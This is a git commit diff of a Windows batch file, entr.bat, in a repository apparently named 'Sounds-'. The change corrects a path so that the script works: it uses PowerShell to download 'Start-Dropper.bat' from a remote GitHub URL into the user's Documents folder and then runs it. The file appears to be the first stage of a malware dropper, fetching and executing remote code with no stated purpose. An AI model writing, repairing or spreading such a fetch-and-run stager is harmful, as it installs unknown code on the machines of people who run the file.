6212fbb99275d40ee68b5121ca7fb48edfc77eaa
[LONG] <91588850+LONG-BAT@users.noreply.github.com>
2026-01-18 00:20:44 -0700

    Add files via upload

--- entr.bat
+++ entr.bat
@@ -1,4 +1,3 @@
 @echo off 
-powershell cd %userprofile%\documents; invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/Start-Dropper.bat' -Outfile ./Dropper.bat; Start-Process -FilePath "%userprofile%\documentsDropper.bat"
+powershell cd %userprofile%\documents; invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/Start-Dropper.bat' -Outfile ./Dropper.bat; Start-Process -FilePath "%userprofile%\documents\Dropper.bat"
 exit
-
